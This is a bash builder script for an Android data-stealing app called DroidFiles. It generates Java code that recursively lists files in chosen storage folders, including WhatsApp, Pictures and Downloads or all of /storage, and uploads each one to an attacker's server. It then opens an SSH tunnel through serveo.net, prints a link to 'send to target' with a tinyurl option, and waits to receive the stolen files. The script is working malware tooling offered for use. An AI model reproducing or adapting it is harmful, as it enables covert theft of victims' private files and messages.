#!/bin/bash
# DroidFiles v1.0
# Author: @thelinuxchoice (You don't become a coder by just changing the credits)
# Instagram: @linux_choice
# Github: https://github.com/thelinuxchoice/droidfiles

host="159.89.214.31" #Serveo.net

trap 'printf "\n";stop' 2

stop() {

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1


}

dependencies() {


command -v apksigner > /dev/null 2>&1 || { echo >&2 "I require apksigner but it's not installed. Install it: apt-get install apksigner. Aborting."; 
exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; 
exit 1; }

command -v gradle > /dev/null 2>&1 || { echo >&2 "I require gradle but it's not installed. Install it. Aborting."; 
exit 1; }

}

banner() {


printf "  \e[1;92m  ____            _     _ _____ _ _            \n"
printf "   |  _ \ _ __ ___ (_) __| |  ___(_) | ___  ___  \n"
printf "   | | | | '__/ _ \| |/ _\` | |_  | | |/ _ \/ __| \n"
printf "   | |_| | | | (_) | | (_| |  _| | | |  __/\__ \ \n"
printf "   |____/|_|  \___/|_|\__,_|_|   |_|_|\___||___/\e[0m\e[1;77mv1.0 \e[0m\n"
                                              
printf "\n"
printf "   \e[1;77mAuthor: https://github.com/thelinuxchoice/droidfiles\n\e[0m"
printf "\n"
}

read_dir() {

printf "\e[1;77m[\e[0m\e[1;92m01\e[0m\e[1;77m] WhatsApp (/storage/emulated/0/WhatsApp)\e[0m\n"
printf "\e[1;77m[\e[0m\e[1;92m02\e[0m\e[1;77m] Pictures (/storage/emulated/0/Pictures)\e[0m\n"
printf "\e[1;77m[\e[0m\e[1;92m03\e[0m\e[1;77m] Downloads (/storage/emulated/0/Download)\e[0m\n"
printf "\e[1;77m[\e[0m\e[1;92m04\e[0m\e[1;77m] Android (/storage/emulated/0/Android)\e[0m\n"
printf "\e[1;77m[\e[0m\e[1;92m05\e[0m\e[1;77m] Custom\e[0m\n"
printf "\e[1;77m[\e[0m\e[1;92m06\e[0m\e[1;77m]\e[0m\e[1;93m Internal Storage (/storage/emulated/0/)\e[0m\n"
printf "\e[1;77m[\e[0m\e[1;92m07\e[0m\e[1;77m]\e[0m\e[1;31m ALL: External + Internal Storage (/storage/)\e[0m\n"
printf "\n"
printf "\e[1;77m[\e[0m\e[1;93mEnter Key\e[0m\e[1;77m]\e[0m\e[1;93m Continue\e[0m\n"
printf "\n"
internal=0
external=0
whatsapp=0
picture=0
download=0
android=0
custom=0
choose_dir=0
while [[ "$choose_dir" != "" ]]; do
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Choose a dir or Hit Enter to continue: \e[0m' choose_dir

if [[ "$choose_dir" != 1 ]] && [[ "$choose_dir" != 2 ]] && [[ "$choose_dir" != 3 ]] && [[ "$choose_dir" != 4 ]] && [[ "$choose_dir" != 5 ]] && [[ "$choose_dir" != 6 ]] && [[ "$choose_dir" != 7 ]] && [[ "$choose_dir" != 99 ]] && [[ "$choose_dir" != "" ]]; then
printf "\e[1;93mInvalid!\e[0m\n"  

elif  [[ $choose_dir -eq 1 ]]; then
whatsapp=1

elif [[ $choose_dir -eq 2 ]]; then
picture=1

elif [[ $choose_dir -eq 3 ]]; then
download=1
elif [[ $choose_dir -eq 4 ]]; then
android=1
elif [[ $choose_dir -eq 5 ]]; then

read -p $'\n\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] (Ex: /storage/emulated/WhatsApp/Media): \e[0m' custom_dir
if [[ $custom_dir != '' ]]; then
custom=1
echo $custom_dir >> custom_dir
fi
elif [[ $choose_dir -eq 6 ]]; then
internal=1
elif [[ $choose_dir -eq 7 ]]; then
external=1

elif [[ $choose_dir -eq 99 ]]; then
exit 1

fi

done

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Setting:\n"

if [[ ! -d app/app/src/main/java/com/droidfiles/ ]]; then
mkdir -p app/app/src/main/java/com/droidfiles/
fi

cat app/main1 > app/app/src/main/java/com/droidfiles/MainActivity.java


if [[ "$internal" -eq 0 ]] && [[ "$external" -eq 0 ]] && [[ "$whatsapp" -eq 0 ]] && [[ "$download" -eq 0 ]] && [[ "$custom" -eq 0 ]] && [[ "$picture" -eq 0 ]] && [[ "$android" -eq 0 ]]; then
echo default
internal=1
fi


if [[ $external -eq 1 ]]; then
internal=0
whatsapp=0
download=0
picture=0
android=0
fi

if [[ $internal -eq 1 ]]; then
whatsapp=0
download=0
picture=0
android=0
printf "    \e[1;77m-\e[0m\e[1;93mInternal Storage\e[0m\n"

#
echo 'File dir1 = new File("/storage/emulated/0");' >> app/app/src/main/java/com/droidfiles/MainActivity.java

echo 'List<File> files1 = (List<File>) FileUtils.listFiles(dir1,
TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		for (File file : files1) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo 'try {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            String path1 = file.getCanonicalPath();' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            upload(path1);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '} catch (Exception e) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            }' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		}' >> app/app/src/main/java/com/droidfiles/MainActivity.java

#

fi

if [[ "$external" -eq 1 ]]; then
printf "    \e[1;77m-\e[0m\e[1;93mExternal + Internal Storage\e[0m\n"

#
echo 'File dir2 = new File("/storage/");' >> app/app/src/main/java/com/droidfiles/MainActivity.java

echo 'List<File> files2 = (List<File>) FileUtils.listFiles(dir2,
TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		for (File file : files2) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo 'try {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            String path2 = file.getCanonicalPath();' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            upload(path2);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '} catch (Exception e) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            }' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		}' >> app/app/src/main/java/com/droidfiles/MainActivity.java

#

fi

if [[ "$whatsapp" -eq 1 ]]; then
printf "    \e[1;77m-\e[0m\e[1;93mWhatsApp\e[0m\n"

#
echo 'File dir3 = new File("/storage/emulated/0/WhatsApp");' >> app/app/src/main/java/com/droidfiles/MainActivity.java

echo 'List<File> files3 = (List<File>) FileUtils.listFiles(dir3,
TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		for (File file : files3) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo 'try {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            String path3 = file.getCanonicalPath();' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            upload(path3);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '} catch (Exception e) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            }' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		}' >> app/app/src/main/java/com/droidfiles/MainActivity.java

#

fi

if [[ "$download" -eq 1 ]]; then
printf "    \e[1;77m-\e[0m\e[1;93mDownloads\e[0m\n"


#
echo 'File dir4 = new File("/storage/emulated/0/Download");' >> app/app/src/main/java/com/droidfiles/MainActivity.java

echo 'List<File> files4 = (List<File>) FileUtils.listFiles(dir4,
TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		for (File file : files4) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo 'try {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            String path4 = file.getCanonicalPath();' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            upload(path4);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '} catch (Exception e) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            }' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		}' >> app/app/src/main/java/com/droidfiles/MainActivity.java


#

fi

if [[ "$android" -eq 1 ]]; then
printf "    \e[1;77m-\e[0m\e[1;93mAndroid\e[0m\n"

#

echo 'File dir5 = new File("/storage/emulated/0/Android");' >> app/app/src/main/java/com/droidfiles/MainActivity.java

echo 'List<File> files5 = (List<File>) FileUtils.listFiles(dir5,
TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		for (File file : files5) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo 'try {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            String path5 = file.getCanonicalPath();' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            upload(path5);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '} catch (Exception e) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            }' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		}' >> app/app/src/main/java/com/droidfiles/MainActivity.java

#
fi

if [[ "$picture" -eq 1 ]]; then
printf "    \e[1;77m-\e[0m\e[1;93mPictures\e[0m\n"

#

echo 'File dir6 = new File("/storage/emulated/0/Pictures");' >> app/app/src/main/java/com/droidfiles/MainActivity.java

echo 'List<File> files6 = (List<File>) FileUtils.listFiles(dir6,
TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		for (File file : files6) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo 'try {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            String path6 = file.getCanonicalPath();' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            upload(path6);' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '} catch (Exception e) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            }' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		}' >> app/app/src/main/java/com/droidfiles/MainActivity.java

#


fi

if [[ "$custom" -eq 1 ]]; then
printf "    \e[1;77m-\e[0m\e[1;93mCustom\e[0m\n"
lines=0
for line_dir in $(cat custom_dir); do



echo $line_dir

#
printf 'File custom_dir%s = new File(\"%s\");\n' $lines $line_dir >> app/app/src/main/java/com/droidfiles/MainActivity.java

printf 'List<File> c_files%s = (List<File>) FileUtils.listFiles(custom_dir%s,
TrueFileFilter.INSTANCE, TrueFileFilter.INSTANCE);\n' $lines $lines >> app/app/src/main/java/com/droidfiles/MainActivity.java
printf '		for (File file : c_files%s) {\n' $lines >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo 'try {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
printf '            String c_path%s = file.getCanonicalPath();\n' $lines >> app/app/src/main/java/com/droidfiles/MainActivity.java
printf '            upload(c_path%s);\n' $lines >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '} catch (Exception e) {' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '            }' >> app/app/src/main/java/com/droidfiles/MainActivity.java
echo '		}' >> app/app/src/main/java/com/droidfiles/MainActivity.java

#

let lines+=1

done
rm -rf custom_dir
fi

cat app/main2 >> app/app/src/main/java/com/droidfiles/MainActivity.java

printf "        String urlServer = \"http://%s:%s/upload_files.php\";\n" $host $port >> app/app/src/main/java/com/droidfiles/MainActivity.java

cat app/main3 >> app/app/src/main/java/com/droidfiles/MainActivity.java


}


createmain() {

if [[ ! -d app/app/src/main/java/com/droidfiles/ ]]; then
mkdir -p app/app/src/main/java/com/droidfiles/
fi

cat app/main1 > app/app/src/main/java/com/droidfiles/MainActivity.java


}


configureapp() {

printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configuring App...\e[0m\n"

createmain
read_dir
}

checkrcv() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting Files,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do

if [[ -e Log.log ]]; then
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] File Received!\e[0m\e[1;77m Saved: app/uploadedfiles/\e[0m\n"
rm -rf Log.log
fi
done 

}

server() {
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting server...\e[0m\n"

if [ ! -d uploadedfiles/ ]; then
mkdir uploadedfiles/
fi

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R '$port':localhost:4444 2> /dev/null > sendlink ' &


sleep 7
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)

printf "\n"
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Send the direct link to target:\e[0m\e[1;77m %s/app.apk \n' $send_link
send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link/app.apk | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"

php -S "localhost:3333" > /dev/null 2>&1 &
php -S "localhost:4444" > /dev/null 2>&1 &
sleep 3
checkrcv
}


checkapk() {
if [[ -e app/build/outputs/apk/app-release-unsigned.apk ]]; then

printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Build Successful, Signing APK...\e[0m\n"

mv app/build/outputs/apk/app-release-unsigned.apk app.apk
echo "      " | apksigner sign --ks key.keystore  app.apk > /dev/null


printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Done!\e[0m\e[1;92m Saved:\e[0m\e[1;77m app/app.apk \e[0m\n"
fi
default_start_server="Y"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Start Server? [Y/n] ' start_server
start_server="${start_server:-${default_start_server}}"
if [[ $start_server == "Y" || $start_server == "Yes" || $start_server == "yes" || $start_server == "y" ]]; then

server
else
exit 1
fi

}

build() {
default_start_build="Y"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Start build? [Y/n]: ' start_build
start_build="${start_build:-${default_start_build}}"
if [[ $start_build == "Y" || $start_build == "Yes" || $start_build == "yes" || $start_build == "y" ]]; then
cd app/
gradle build
checkapk
else
exit 1
fi
}

port_conn() {

default_port=$(seq 1111 4444 | sort -R | head -n1)
printf '\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Choose a Port (Default:\e[0m\e[1;92m %s \e[0m\e[1;77m): \e[0m' $default_port
read port
port="${port:-${default_port}}"

}


start() {

if [[ -e "app/sendlink" ]]; then
rm -rf app/sendlink 
fi
default_sdk_dir="/root/Android/Sdk"
read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Put Location of the SDK (Default /root/Android/Sdk): \e[0m' sdk_dir

sdk_dir="${sdk_dir:-${default_sdk_dir}}"

if [[ ! -d $sdk_dir ]]; then
printf "\e[1;93m[!] Directory Not Found!\e[0m\n"
sleep 1
start
else
printf "sdk.dir=%s\n" > app/local.properties $sdk_dir
port_conn
configureapp
build
fi


}
banner
dependencies
start
